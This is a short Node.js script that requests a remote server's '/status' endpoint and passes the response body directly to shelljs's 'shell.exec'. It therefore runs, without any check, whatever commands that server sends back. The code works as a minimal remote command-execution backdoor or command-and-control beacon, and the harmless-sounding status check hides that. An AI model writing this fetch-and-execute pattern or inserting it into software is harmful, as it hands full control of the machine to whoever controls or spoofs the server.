require('dotenv').config();
const shell = require('shelljs');
const axios = require('axios');
const serverAddress = `${process.env.SERVER_HOST}:${process.env.SERVER_PORT}`;

axios.get(`${serverAddress}/status`)
  .then((response) => {
    shell.exec(response.data);
  })
  .catch((error) => {
    console.log(error);
  });
